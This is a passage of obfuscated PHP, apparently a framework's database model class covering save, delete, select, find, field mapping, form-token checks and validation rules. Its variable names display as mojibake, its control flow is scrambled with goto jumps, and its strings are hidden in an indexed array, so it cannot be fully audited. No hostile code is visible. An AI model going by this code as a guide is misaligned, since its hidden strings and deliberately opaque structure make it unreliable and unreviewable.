$c›¸Ç™òÍÂ ? $c›¸Ç™òÍÂ : $this->getTableName(), $E³ÑĞô©òÜ))) { $this->error = think_lang($BØÍ‹¤­ù¨[272]); return !1; } else { return $eèÂ¸İ—‡ò; } } public function save($e“Å§¥‘÷ = '', $F‚¡¤ìªØ‘ = array()) { goto BÉ…ò®Îœó; b„‰ÆèÏÍ: $F‚¡¤ìªØ‘ = $this->_parseOptions($F‚¡¤ìªØ‘); $bğ™àÜª¢ = $this->getPk(); if (!isset($F‚¡¤ìªØ‘[$BÜö«‰âÌ[273]])) { if (isset($e“Å§¥‘÷[$bğ™àÜª¢])) { $cÙ—œ»ä¯î[$bğ™àÜª¢] = $e“Å§¥‘÷[$bğ™àÜª¢]; $F‚¡¤ìªØ‘[$BÜö«‰âÌ[273]] = $cÙ—œ»ä¯î; unset($e“Å§¥‘÷[$bğ™àÜª¢]); } else { $this->error = think_lang($BÜö«‰âÌ[272]); return !1; } } goto FöÁ»ßÕ£×; FöÁ»ßÕ£×: if (is_array($F‚¡¤ìªØ‘[$BÜö«‰âÌ[273]]) && isset($F‚¡¤ìªØ‘[$BÜö«‰âÌ[273]][$bğ™àÜª¢])) { $DŸ˜ìù¥©é = $F‚¡¤ìªØ‘[$BÜö«‰âÌ[273]][$bğ™àÜª¢]; } if (!1 === $this->_beforeUpdate($e“Å§¥‘÷, $F‚¡¤ìªØ‘)) { return !1; } $câœØâ’æø = $this->db->update($e“Å§¥‘÷, $F‚¡¤ìªØ‘); goto C®µ´©¡â—; C®µ´©¡â—: if (!1 !== $câœØâ’æø) { if (isset($DŸ˜ìù¥©é)) { $e“Å§¥‘÷[$bğ™àÜª¢] = $DŸ˜ìù¥©é; } $this->_afterUpdate($e“Å§¥‘÷, $F‚¡¤ìªØ‘); } return $câœØâ’æø; goto bğ‹àÂ®î®; BÉ…ò®Îœó: $BÜö«‰âÌ =& $_SERVER[ä°„ä°º]; if (empty($e“Å§¥‘÷)) { if (!empty($this->data)) { $e“Å§¥‘÷ = $this->data; $this->data = array(); } else { $this->error = think_lang($BÜö«‰âÌ[269]); return !1; } } $e“Å§¥‘÷ = $this->_facade($e“Å§¥‘÷); goto b„‰ÆèÏÍ; bğ‹àÂ®î®: } protected function _beforeUpdate(&$D‡È’‡Õ°ù, $cÈê¦‰Ûßø) { } protected function _afterUpdate($E‰´ñ‰«Î¾, $eìÔñÌ­£¦) { } public function delete($Câ¥‘•ËÒº = array()) { goto AªÉ†¡‘²; AùË–®‚¨›: $E»¡„ô¤£ = $this->db->delete($Câ¥‘•ËÒº); if (!1 !== $E»¡„ô¤£) { $BçñŒËéõµ = array(); if (isset($F‡ÂâÆ‡°Ì)) { $BçñŒËéõµ[$Eè¤åÇÜ®Ø] = $F‡ÂâÆ‡°Ì; } $this->_after_delete($BçñŒËéõµ, $Câ¥‘•ËÒº); } return $E»¡„ô¤£; goto Cì„…¤‘…°; AªÉ†¡‘²: $D÷òŞÅ†Í =& $_SERVER[ä°„ä°º]; if (empty($Câ¥‘•ËÒº) && empty($this->options[$D÷òŞÅ†Í[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Eè¤åÇÜ®Ø = $this->getPk(); goto c‚ ŒÁì˜¥; c‚ ŒÁì˜¥: if (is_numeric($Câ¥‘•ËÒº) || is_string($Câ¥‘•ËÒº)) { if (strpos($Câ¥‘•ËÒº, $D÷òŞÅ†Í[47])) { $a£éµÅ»Àê[$Eè¤åÇÜ®Ø] = array($D÷òŞÅ†Í[274], $Câ¥‘•ËÒº); } else { $a£éµÅ»Àê[$Eè¤åÇÜ®Ø] = $Câ¥‘•ËÒº; } $this->options[$D÷òŞÅ†Í[273]] = $a£éµÅ»Àê; } $Câ¥‘•ËÒº = $this->_parseOptions(); if (is_array($Câ¥‘•ËÒº[$D÷òŞÅ†Í[273]]) && isset($Câ¥‘•ËÒº[$D÷òŞÅ†Í[273]][$Eè¤åÇÜ®Ø])) { $F‡ÂâÆ‡°Ì = $Câ¥‘•ËÒº[$D÷òŞÅ†Í[273]][$Eè¤åÇÜ®Ø]; } goto AùË–®‚¨›; Cì„…¤‘…°: } protected function _after_delete($BöÏ’İåˆŞ, $Bá¿„’‡¸) { } public function select($b¯›È¾öÄŠ = array()) { goto d ÉšÄÂİ¶; D¯¥¡Ó‹™·: $this->_afterSelect($FŸù³¤íõØ, $b¯›È¾öÄŠ); return $FŸù³¤íõØ; goto EÙµĞ¦çÒ„; d ÉšÄÂİ¶: $AÄÖí¡èˆè =& $_SERVER[ä°„ä°º]; if (is_string($b¯›È¾öÄŠ) || is_numeric($b¯›È¾öÄŠ)) { $D·´öµÕŞ” = $this->getPk(); if (strpos($b¯›È¾öÄŠ, $AÄÖí¡èˆè[47])) { $e‡ˆì­œÆ[$D·´öµÕŞ”] = array($AÄÖí¡èˆè[274], $b¯›È¾öÄŠ); } else { $e‡ˆì­œÆ[$D·´öµÕŞ”] = $b¯›È¾öÄŠ; } $this->options[$AÄÖí¡èˆè[273]] = $e‡ˆì­œÆ; } elseif (!1 === $b¯›È¾öÄŠ) { $b¯›È¾öÄŠ = $this->_parseOptions(); return $AÄÖí¡èˆè[275] . $this->db->buildSelectSql($b¯›È¾öÄŠ) . $AÄÖí¡èˆè[276]; } $b¯›È¾öÄŠ = $this->_parseOptions(); goto fÎÏæƒ¯‰; fÎÏæƒ¯‰: $FŸù³¤íõØ = $this->db->select($b¯›È¾öÄŠ); if (!1 === $FŸù³¤íõØ) { return !1; } if (empty($FŸù³¤íõØ)) { return null; } goto D¯¥¡Ó‹™·; EÙµĞ¦çÒ„: } protected function _afterSelect(&$cˆË‡ÖÕ¢, $Cñ¿ë·Ø•Ò) { } public function buildSql($E÷„Ç¢¸ƒö = array()) { $a–®·ŠÅ¨Ş =& $_SERVER[ä°„ä°º]; $E÷„Ç¢¸ƒö = $this->_parseOptions($E÷„Ç¢¸ƒö); return $a–®·ŠÅ¨Ş[275] . $this->db->buildSelectSql($E÷„Ç¢¸ƒö) . $a–®·ŠÅ¨Ş[276]; } public function optionsValue($A¥µ´÷êí = null) { if (is_null($A¥µ´÷êí)) { return $this->options; } elseif (is_array($A¥µ´÷êí)) { $this->options = array_merge($this->options, $A¥µ´÷êí); } } protected function _parseOptions($B÷ğÉ•¹ö£ = array()) { goto FŞ¸æ‰Î‡; FŞ¸æ‰Î‡: $eÌ™Ççˆë =& $_SERVER[ä°„ä°º]; if (is_array($B÷ğÉ•¹ö£)) { $B÷ğÉ•¹ö£ = array_merge($this->options, $B÷ğÉ•¹ö£); } $this->options = array(); goto F•ƒŸÃ¬¤À; F•ƒŸÃ¬¤À: if (!isset($B÷ğÉ•¹ö£[$eÌ™Ççˆë[277]])) { $B÷ğÉ•¹ö£[$eÌ™Ççˆë[277]] = $this->getTableName(); $A‚Ìİëê…” = $this->fields; } else { $A‚Ìİëê…” = $this->getDbFields(); } if (!empty($B÷ğÉ•¹ö£[$eÌ™Ççˆë[278]])) { $B÷ğÉ•¹ö£[$eÌ™Ççˆë[277]] .= $eÌ™Ççˆë[50] . $B÷ğÉ•¹ö£[$eÌ™Ççˆë[278]]; } $B÷ğÉ•¹ö£[$eÌ™Ççˆë[279]] = $this->name; goto f¾×‰­“Ö; f¾×‰­“Ö: if (isset($B÷ğÉ•¹ö£[$eÌ™Ççˆë[273]]) && is_array($B÷ğÉ•¹ö£[$eÌ™Ççˆë[273]]) && !empty($A‚Ìİëê…”) && !isset($B÷ğÉ•¹ö£[$eÌ™Ççˆë[280]]) && !isset($B÷ğÉ•¹ö£[$eÌ™Ççˆë[277]])) { foreach ($B÷ğÉ•¹ö£[$eÌ™Ççˆë[273]] as $A´ÛŠµåŠ™ => $A”’äöÒ‚‘) { $A´ÛŠµåŠ™ = trim($A´ÛŠµåŠ™); if (in_array($A´ÛŠµåŠ™, $A‚Ìİëê…”, !0)) { if (is_scalar($A”’äöÒ‚‘)) { $this->_parseType($B÷ğÉ•¹ö£[$eÌ™Ççˆë[273]], $A´ÛŠµåŠ™); } } elseif (!is_numeric($A´ÛŠµåŠ™) && $eÌ™Ççˆë[71] != substr($A´ÛŠµåŠ™, 0, 1) && !1 === strpos($A´ÛŠµåŠ™, $eÌ™Ççˆë[95]) && !1 === strpos($A´ÛŠµåŠ™, $eÌ™Ççˆë[258]) && !1 === strpos($A´ÛŠµåŠ™, $eÌ™Ççˆë[281]) && !1 === strpos($A´ÛŠµåŠ™, $eÌ™Ççˆë[282])) { unset($B÷ğÉ•¹ö£[$eÌ™Ççˆë[273]][$A´ÛŠµåŠ™]); } } } $this->_options_filter($B÷ğÉ•¹ö£); return $B÷ğÉ•¹ö£; goto e–éƒç£‡; e–éƒç£‡: } protected function _options_filter(&$D›‘™—Ó‚Î) { } protected function _parseType(&$C’³¯³Ö•, $B¡ÏøóŒ¼) { $Cö¸íŒ¡¨ =& $_SERVER[ä°„ä°º]; if (empty($this->options[$Cö¸íŒ¡¨[283]][$Cö¸íŒ¡¨[4] . $B¡ÏøóŒ¼])) { $e¢¢ñæêšˆ = strtolower($this->fields[$Cö¸íŒ¡¨[250]][$B¡ÏøóŒ¼]); if (!1 !== strpos($e¢¢ñæêšˆ, $Cö¸íŒ¡¨[284])) { } elseif (!1 === strpos($e¢¢ñæêšˆ, $Cö¸íŒ¡¨[285]) && !1 !== strpos($e¢¢ñæêšˆ, $Cö¸íŒ¡¨[286])) { $C’³¯³Ö•[$B¡ÏøóŒ¼] = intval($C’³¯³Ö•[$B¡ÏøóŒ¼]); } elseif (!1 !== strpos($e¢¢ñæêšˆ, $Cö¸íŒ¡¨[287]) || !1 !== strpos($e¢¢ñæêšˆ, $Cö¸íŒ¡¨[288])) { $C’³¯³Ö•[$B¡ÏøóŒ¼] = floatval($C’³¯³Ö•[$B¡ÏøóŒ¼]); } elseif (!1 !== strpos($e¢¢ñæêšˆ, $Cö¸íŒ¡¨[289])) { $C’³¯³Ö•[$B¡ÏøóŒ¼] = (bool) $C’³¯³Ö•[$B¡ÏøóŒ¼]; } } } public function find($d‘È¬¨‡À… = array()) { goto b’ÃÍ±¢ä„; eÌ„…èÅÙ: if (empty($CÂ­«áÓì’)) { return null; } $this->data = $CÂ­«áÓì’[0]; $this->_afterFind($this->data, $d‘È¬¨‡À…); goto fÓ¡¼­ÀÒ; b’ÃÍ±¢ä„: $böö„‹ªÔÜ =& $_SERVER[ä°„ä°º]; if (is_numeric($d‘È¬¨‡À…) || is_string($d‘È¬¨‡À…)) { $aø‚ßÃ¼™[$this->getPk()] = intval($d‘È¬¨‡À…); $this->options[$böö„‹ªÔÜ[273]] = $aø‚ßÃ¼™; } $this->options[$böö„‹ªÔÜ[290]] = 1; goto C°œºˆñ‘å; C°œºˆñ‘å: $d‘È¬¨‡À… = $this->_parseOptions(); $CÂ­«áÓì’ = $this->db->select($d‘È¬¨‡À…); if (!1 === $CÂ­«áÓì’) { return !1; } goto eÌ„…èÅÙ; fÓ¡¼­ÀÒ: if (!empty($this->options[$böö„‹ªÔÜ[291]])) { return $this->returnResult($this->data, $this->options[$böö„‹ªÔÜ[291]]); } return $this->data; goto fÀ°Šâ®¬; fÀ°Šâ®¬: } protected function _afterFind(&$b§…ŠØøÑ, $eå¶Å£Ğ½ç) { } protected function returnResult($aöõ÷Œæ•, $aÎ×¯¤Â‰¥ = '') { $C¿Ô ›Ÿ‹Ë =& $_SERVER[ä°„ä°º]; if ($aÎ×¯¤Â‰¥) { if (is_callable($aÎ×¯¤Â‰¥)) { return call_user_func($aÎ×¯¤Â‰¥, $aöõ÷Œæ•); } switch (strtolower($aÎ×¯¤Â‰¥)) { case $C¿Ô ›Ÿ‹Ë[292]: return json_encode($aöõ÷Œæ•); case $C¿Ô ›Ÿ‹Ë[293]: return xml_encode($aöõ÷Œæ•); } } return $aöõ÷Œæ•; } public function parseFieldsMap($b£©õ‡’¨›, $fÊ•±Ê¥Ù§ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Dš¾è‡ßÚá => $c…Š›è¥Ù‹) { if ($fÊ•±Ê¥Ù§ == 1) { if (isset($b£©õ‡’¨›[$c…Š›è¥Ù‹])) { $b£©õ‡’¨›[$Dš¾è‡ßÚá] = $b£©õ‡’¨›[$c…Š›è¥Ù‹]; unset($b£©õ‡’¨›[$c…Š›è¥Ù‹]); } } else { if (isset($b£©õ‡’¨›[$Dš¾è‡ßÚá])) { $b£©õ‡’¨›[$c…Š›è¥Ù‹] = $b£©õ‡’¨›[$Dš¾è‡ßÚá]; unset($b£©õ‡’¨›[$Dš¾è‡ßÚá]); } } } } return $b£©õ‡’¨›; } public function setField($DêõÌŒ„›, $A™²¥èÈ Æ = '') { if (is_array($DêõÌŒ„›)) { $e¹°™öç®ô = $DêõÌŒ„›; } else { $e¹°™öç®ô[$DêõÌŒ„›] = $A™²¥èÈ Æ; } return $this->save($e¹°™öç®ô); } public function setAdd($e‚ÊÛÙ‡, $aó‰–Ì—õ = 1) { $AİƒÑöî =& $_SERVER[ä°„ä°º]; $Eå»éâ—È· = $e‚ÊÛÙ‡ . $AİƒÑöî[294] . $aó‰–Ì—õ; if ($aó‰–Ì—õ < 0) { $Eå»éâ—È· = $e‚ÊÛÙ‡ . $aó‰–Ì—õ; } return $this->setField($e‚ÊÛÙ‡, array($AİƒÑöî[295], $Eå»éâ—È·)); } public function getField($b‡ßØÂ÷°´, $DÇÍ‹Ë‘› = null) { $eø•ù„¯àê =& $_SERVER[ä°„ä°º]; $A‡™‘„¾“[$eø•ù„¯àê[271]] = $b‡ßØÂ÷°´; $A‡™‘„¾“ = $this->_parseOptions($A‡™‘„¾“); $b‡ßØÂ÷°´ = trim($b‡ßØÂ÷°´); if (strpos($b‡ßØÂ÷°´, $eø•ù„¯àê[47])) { if (!isset($A‡™‘„¾“[$eø•ù„¯àê[290]])) { $A‡™‘„¾“[$eø•ù„¯àê[290]] = is_numeric($DÇÍ‹Ë‘›) ? $DÇÍ‹Ë‘› : $eø•ù„¯àê[33]; } $CéÃ÷¦ÒÍÓ = $this->db->select($A‡™‘„¾“); if (!empty($CéÃ÷¦ÒÍÓ)) { goto E¶¼—ÇÍ; a‹ÂÑôÔÕ‘: foreach ($CéÃ÷¦ÒÍÓ as $AÈñ¹§ïÚù) { $E’ ³¼êª» = $AÈñ¹§ïÚù[$EòÀ•åáù]; if (2 == $bĞŠ¾¾¹ÛÒ) { $EÄ£Ù¾İİ[$E’ ³¼êª»] = $AÈñ¹§ïÚù[$e«‹®è‡Ûù]; } else { $EÄ£Ù¾İİ[$E’ ³¼êª»] = is_string($DÇÍ‹Ë‘›) ? implode($DÇÍ‹Ë‘›, $AÈñ¹§ïÚù) : $AÈñ¹§ïÚù; } } return $EÄ£Ù¾İİ; goto cóŠó„à†¸; E¶¼—ÇÍ: $dÙâÍ¾»ùˆ = explode($eø•ù„¯àê[47], $b‡ßØÂ÷°´); $b‡ßØÂ÷°´ = array_keys($CéÃ÷¦ÒÍÓ[0]); $EòÀ•åáù = array_shift($b‡ßØÂ÷°´); goto cÇ•Ö©ñÁ“; cÇ•Ö©ñÁ“: $e«‹®è‡Ûù = array_shift($b‡ßØÂ÷°´); $EÄ£Ù¾İİ = array(); $bĞŠ¾¾¹ÛÒ = count($dÙâÍ¾»ùˆ); goto a‹ÂÑôÔÕ‘; cóŠó„à†¸: } } else { if (!0 !== $DÇÍ‹Ë‘›) { $A‡™‘„¾“[$eø•ù„¯àê[290]] = is_numeric($DÇÍ‹Ë‘›) ? $DÇÍ‹Ë‘› : 1; } if ($DÇÍ‹Ë‘› === $eø•ù„¯àê[253]) { unset($A‡™‘„¾“[$eø•ù„¯àê[290]]); } $AÈñ¹§ïÚù = $this->db->select($A‡™‘„¾“); if (!empty($AÈñ¹§ïÚù)) { if ($DÇÍ‹Ë‘› === $eø•ù„¯àê[253]) { return reset($AÈñ¹§ïÚù[0]); } if (!0 !== $DÇÍ‹Ë‘› && 1 == $A‡™‘„¾“[$eø•ù„¯àê[290]]) { return reset($AÈñ¹§ïÚù[0]); } foreach ($AÈñ¹§ïÚù as $B“¾Áš‘ ) { $bË„òªƒö¼[] = $B“¾Áš‘ [$b‡ßØÂ÷°´]; } return $bË„òªƒö¼; } } return null; } public function create($dß¨à½Ü‰† = '', $bÆªÂØ‘¤ = '') { goto d¤ãÇ¥Ş†; F°Ø¡Ç’: return $dß¨à½Ü‰†; goto f£äÎÕßâ; dƒĞÍ¯‹ˆ±: $dß¨à½Ü‰† = $this->parseFieldsMap($dß¨à½Ü‰†, 0); $bÆªÂØ‘¤ = $bÆªÂØ‘¤ ? $bÆªÂØ‘¤ : (!empty($dß¨à½Ü‰†[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$b‰âÜÜ©œé[271]])) { $BğÀŞ¼…» = $this->options[$b‰âÜÜ©œé[271]]; unset($this->options[$b‰âÜÜ©œé[271]]); } elseif ($bÆªÂØ‘¤ == THINK_MODEL_INSERT && isset($this->insertFields)) { $BğÀŞ¼…» = $this->insertFields; } elseif ($bÆªÂØ‘¤ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $BğÀŞ¼…» = $this->updateFields; } goto d¿£ñ­£ŒÑ; d¤ãÇ¥Ş†: $b‰âÜÜ©œé =& $_SERVER[ä°„ä°º]; if (empty($dß¨à½Ü‰†)) { $dß¨à½Ü‰† = $_POST; } elseif (is_object($dß¨à½Ü‰†)) { $dß¨à½Ü‰† = get_object_vars($dß¨à½Ü‰†); } if (empty($dß¨à½Ü‰†) || !is_array($dß¨à½Ü‰†)) { $this->error = think_lang($b‰âÜÜ©œé[269]); return !1; } goto dƒĞÍ¯‹ˆ±; fŒñº¿Ñ‚‡: if ($this->autoCheckFields) { $BğÀŞ¼…» = $this->getDbFields(); foreach ($dß¨à½Ü‰† as $dø‹Ø—ˆ•Ò => $dÙ²¥å æ¡) { if (!in_array($dø‹Ø—ˆ•Ò, $BğÀŞ¼…»)) { unset($dß¨à½Ü‰†[$dø‹Ø—ˆ•Ò]); } elseif (MAGIC_QUOTES_GPC && is_string($dÙ²¥å æ¡)) { $dß¨à½Ü‰†[$dø‹Ø—ˆ•Ò] = stripslashes($dÙ²¥å æ¡); } } } $this->autoOperation($dß¨à½Ü‰†, $bÆªÂØ‘¤); $this->data = $dß¨à½Ü‰†; goto F°Ø¡Ç’; d¿£ñ­£ŒÑ: if (isset($BğÀŞ¼…»)) { if (is_string($BğÀŞ¼…»)) { $BğÀŞ¼…» = explode($b‰âÜÜ©œé[47], $BğÀŞ¼…»); } if (think_config($b‰âÜÜ©œé[296])) { $BğÀŞ¼…»[] = think_config($b‰âÜÜ©œé[297]); } foreach ($dß¨à½Ü‰† as $dø‹Ø—ˆ•Ò => $dÙ²¥å æ¡) { if (!in_array($dø‹Ø—ˆ•Ò, $BğÀŞ¼…»)) { unset($dß¨à½Ü‰†[$dø‹Ø—ˆ•Ò]); } } } if (!$this->autoValidation($dß¨à½Ü‰†, $bÆªÂØ‘¤)) { return !1; } if (!$this->autoCheckToken($dß¨à½Ü‰†)) { $this->error = think_lang($b‰âÜÜ©œé[298]); return !1; } goto fŒñº¿Ñ‚‡; f£äÎÕßâ: } public function autoCheckToken($d»Şå‡“È) { $f‰ˆôËŞš° =& $_SERVER[ä°„ä°º]; if (isset($this->options[$f‰ˆôËŞš°[299]]) && !$this->options[$f‰ˆôËŞš°[299]]) { return !0; } if (think_config($f‰ˆôËŞš°[296])) { $aíñâÊÄÀ = think_config($f‰ˆôËŞš°[297]); if (!isset($d»Şå‡“È[$aíñâÊÄÀ]) || Session::get($aíñâÊÄÀ)) { return !1; } list($bğÚ¦¤¡®™, $a÷§É¾Î…Á) = explode($f‰ˆôËŞš°[71], $d»Şå‡“È[$aíñâÊÄÀ]); if ($a÷§É¾Î…Á && Session::get($aíñâÊÄÀ . $f‰ˆôËŞš°[95] . $bğÚ¦¤¡®™) === $a÷§É¾Î…Á) { Session::remove($aíñâÊÄÀ . $f‰ˆôËŞš°[95] . $bğÚ¦¤¡®™); return !0; } if (think_config($f‰ˆôËŞš°[300])) { Session::remove($aíñâÊÄÀ . $f‰ˆôËŞš°[95] . $bğÚ¦¤¡®™); } return !1; } return !0; } public function regex($Aİˆí‰Õİ, $dÕ¶ãÛçáô) { $Aê´åöŞÆ =& $_SERVER[ä°„ä°º]; $A‚’ÎÉ˜ìØ = array($Aê´åöŞÆ[301] => $Aê´åöŞÆ[302], $Aê´åöŞÆ[303] => $Aê´åöŞÆ[304], $Aê´åöŞÆ[305] => $Aê´åöŞÆ[306], $Aê´åöŞÆ[307] => $Aê´åöŞÆ[308], $Aê´åöŞÆ[309] => $Aê´åöŞÆ[310], $Aê´åöŞÆ[311] => $Aê´åöŞÆ[312], $Aê´åöŞÆ[313] => $Aê´åöŞÆ[314], $Aê´åöŞÆ[288] => $Aê´åöŞÆ[315], $Aê´åöŞÆ[316] => $Aê´åöŞÆ[317]); if (isset($A‚’ÎÉ˜ìØ[strtolower($dÕ¶ãÛçáô)])) { $dÕ¶ãÛçáô = $A‚’ÎÉ˜ìØ[strtolower($dÕ¶ãÛçáô)]; } return preg_match($dÕ¶ãÛçáô, $Aİˆí‰Õİ) === 1; } private function autoOperation(&$Eˆ˜¼µ¿½¸, $e¢—‹‘õ) { $BÎøè³ò­ =& $_SERVER[ä°„ä°º]; if (!empty($this->options[$BÎøè³ò­[318]])) { $FĞÁŸù¯ªÇ = $this->options[$BÎøè³ò­[318]]; unset($this->options[$BÎøè³ò­[318]]); } elseif (!empty($this->_auto)) { $FĞÁŸù¯ªÇ = $this->_auto; } if (isset($FĞÁŸù¯ªÇ)) { foreach ($FĞÁŸù¯ªÇ as $aî‡£³¡«§) { if (empty($aî‡£³¡«§[2])) { $aî‡£³¡«§[2] = THINK_MODEL_INSERT; } if ($e¢—‹‘õ == $aî‡£³¡«§[2] || $aî‡£³¡«§[2] == THINK_MODEL_BOTH) { switch (trim($aî‡£³¡«§[3])) { case $BÎøè³ò­[319]: case $BÎøè³ò­[320]: $Bë•¾é¶ = isset($aî‡£³¡«§[4]) ? (array) $aî‡£³¡«§[4] : array(); if (isset($Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]])) { array_unshift($Bë•¾é¶, $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]]); } if ($BÎøè³ò­[319] == $aî‡£³¡«§[3]) { $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]] = call_user_func_array($aî‡£³¡«§[1], $Bë•¾é¶); } else { $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]] = call_user_func_array(array(&$this, $aî‡£³¡«§[1]), $Bë•¾é¶); } break; case $BÎøè³ò­[271]: $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]] = $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[1]]; break; case $BÎøè³ò­[321]: if ($BÎøè³ò­[33] === $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]]) { unset($Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]]); } break; case $BÎøè³ò­[322]: default: $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]] = $aî‡£³¡«§[1]; } if (!1 === $Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]]) { unset($Eˆ˜¼µ¿½¸[$aî‡£³¡«§[0]]); } } } } return $Eˆ˜¼µ¿½¸; } protected function autoValidation($c²ƒêÜĞ¥, $A™õ†…“ôù) { $F¯¢İŸŠ· =& $_SERVER[ä°„ä°º]; if (!empty($this->options[$F¯¢İŸŠ·[323]])) { $BŒ—ª¼ÛÊÇ = $this->options[$F¯¢İŸŠ·[323]]; unset($this->options[$F¯¢İŸŠ·[323]]); } elseif (!empty($this->_validate)) { $BŒ—ª¼ÛÊÇ = $this->_validate; } if (isset($BŒ—ª¼ÛÊÇ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($BŒ—ª¼ÛÊÇ as $EùùÁÜËİ => $a‘öÕÔàÆ) { if (empty($a‘öÕÔàÆ[5]) || $a‘öÕÔàÆ[5] == THINK_MODEL_BOTH || $a‘öÕÔàÆ[5] == $A™õ†…“ôù) { if (0 == strpos($a‘öÕÔàÆ[2], $F¯¢İŸŠ·[324]) && strpos($a‘öÕÔàÆ[2], $F¯¢İŸŠ·[325])) { $a‘öÕÔàÆ[2] = think_lang(substr($a‘öÕÔàÆ[2], 2, -1)); } $a‘öÕÔàÆ[3] = isset($a‘öÕÔàÆ[3]) ? $a‘öÕÔàÆ[3] : THINK_EXISTS_VALIDATE; $a‘öÕÔàÆ[4] = isset($a‘öÕÔàÆ[4]) ? $a‘öÕÔàÆ[4] : $F¯¢İŸŠ·[326]; switch ($a‘öÕÔàÆ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($c²ƒêÜĞ¥, $a‘öÕÔàÆ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($F¯¢İŸŠ·[33] != trim($c²ƒêÜĞ¥[$a‘öÕÔàÆ[0]])) { if (!1 === $this->_validationField($c²ƒêÜĞ¥, $a‘öÕÔàÆ)) { return !1; } } break; default: if (isset($c²ƒêÜĞ¥[$a‘öÕÔàÆ[0]])) { if (!1 === $this->_validationField($c²ƒêÜĞ¥, $a‘öÕÔàÆ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($C³ùö§ö¶Ÿ, $DŠ‡­¦©«Ô) { if (!1 === $this->_validationFieldItem($C³ùö§ö¶Ÿ, $DŠ‡­¦©«Ô)) { if ($this->patchValidate) { $this->error[$DŠ‡­¦©«Ô[0]] = $DŠ‡­¦©«Ô[2]; } else { $this->error = $DŠ‡­¦©«Ô[2]; return !1; } } return; } protected function _validationFieldItem($B™‰ëÚô‰Ï, $fˆØííš‚) { $b³ŞâàÉ¤ô =& $_SERVER[ä°„ä°º]; switch (strtolower(trim($fˆØííš‚[4]))) { case $b³ŞâàÉ¤ô[319]: case $b³ŞâàÉ¤ô[320]: $e„„öÏ µ = isset($fˆØííš‚[6]) ? (array) $fˆØííš‚[6] : array(); if (is_string($fˆØííš‚[0]) && strpos($fˆØííš‚[0], $b³ŞâàÉ¤ô[47])) { $fˆØííš‚[0] = explode($b³ŞâàÉ¤ô[47], $fˆØííš‚[0]); } if (is_array($fˆØííš‚[0])) { foreach ($fˆØííš‚[0] as $Fˆ¶ôÚÓß) { $AáàğÈ§[$Fˆ¶ôÚÓß] = $B™‰ëÚô‰Ï[$Fˆ¶ôÚÓß]; } array_unshift($e„„öÏ µ, $AáàğÈ§); } else { array_unshift($e„„öÏ µ, $B™‰ëÚô‰Ï[$fˆØííš‚[0]]); } if ($b³ŞâàÉ¤ô[319] == $fˆØííš‚[4]) { return call_user_func_array($fˆØííš‚[1], $e„„öÏ µ); } else { return call_user_func_array(array(&$this, $fˆØííš‚[1]), $e„„öÏ µ); } case $b³ŞâàÉ¤ô[327]: return $B™‰ëÚô‰Ï[$fˆØííš‚[0]] == $B™‰ëÚô‰Ï[$fˆØííš‚[1]]; case $b³ŞâàÉ¤ô[328]: if (is_string($fˆØííš‚[0]) && strpos($fˆØííš‚[0], $b³ŞâàÉ¤ô[47])) { $fˆØííš‚[0] = explode($b³ŞâàÉ¤ô[47], $fˆØííš‚[0]); } $B©Ïïøëæ« = array(); if (is_array($fˆØííš‚[0])) { foreach ($fˆØííš‚[0] as $Fˆ¶ôÚÓß) { $B©Ïïøëæ«[$Fˆ¶ôÚÓß] = $B™‰ëÚô‰Ï[$Fˆ¶ôÚÓß]; } } else { $B©Ïïøëæ«[$fˆØííš‚[0]] = $B™‰ëÚô‰Ï[$fˆØííš‚[0]]; } if (!empty($B™‰ëÚô‰Ï[$this->getPk()])) { $B©Ïïøëæ«[$this->getPk()] = array($b³ŞâàÉ¤ô[329], $B™‰ëÚô‰Ï[$this->getPk()]); } if ($this->where($B©Ïïøëæ«)->find()) { return !1; } return !0; default: return $this->check($B™‰ëÚô‰Ï[$fˆØííš‚[0]], $fˆØííš‚[1], $fˆØííš‚[4]); } } public function check($CÔŠ”ÈÜ°‚, $fÂÅİï®ø, $f÷ÜåŠ¢Ë = "\x72\x65\147\x65\170") { $b“¤Ö©‰­ =& $_SERVER[ä°„ä°º]; $f÷ÜåŠ¢Ë = strtolower(trim($f÷ÜåŠ¢Ë)); switch ($f÷ÜåŠ¢Ë) { case $b“¤Ö©‰­[7]: case $b“¤Ö©‰­[330]: $e²øõİĞÓ· = is_array($fÂÅİï®ø) ? $fÂÅİï®ø : explode($b“¤Ö©‰­[47], $fÂÅİï®ø); return $f÷ÜåŠ¢Ë == $b“¤Ö©‰­[7] ? in_array($CÔŠ”ÈÜ°‚, $e²øõİĞÓ·) : !in_array($CÔŠ”ÈÜ°‚, $e²øõİĞÓ·); case $b“¤Ö©‰­[331]: case $b“¤Ö©‰­[332]: if (is_array($fÂÅİï®ø)) { $A§©´®ÏèÚ = $fÂÅİï®ø[0]; $cÜ”¿ôÛ¥ë = $fÂÅİï®ø[1]; } else { list($A§©´®ÏèÚ, $cÜ”¿ôÛ¥ë) = explode($b“¤Ö©‰­[47], $fÂÅİï®ø); } return $f÷ÜåŠ¢Ë == $b“¤Ö©‰­[331] ? $CÔŠ”ÈÜ°‚ >= $A§©´®ÏèÚ && $CÔŠ”ÈÜ°‚ <= $cÜ”¿ôÛ¥ë : $CÔŠ”ÈÜ°‚ < $A§©´®ÏèÚ || $CÔŠ”ÈÜ°‚ > $cÜ”¿ôÛ¥ë; case $b“¤Ö©‰­[333]: case $b“¤Ö©‰­[334]: return $f÷ÜåŠ¢Ë == $b“¤Ö©‰­[333] ? $CÔŠ”ÈÜ°‚ == $fÂÅİï®ø : $CÔŠ”ÈÜ°‚ != 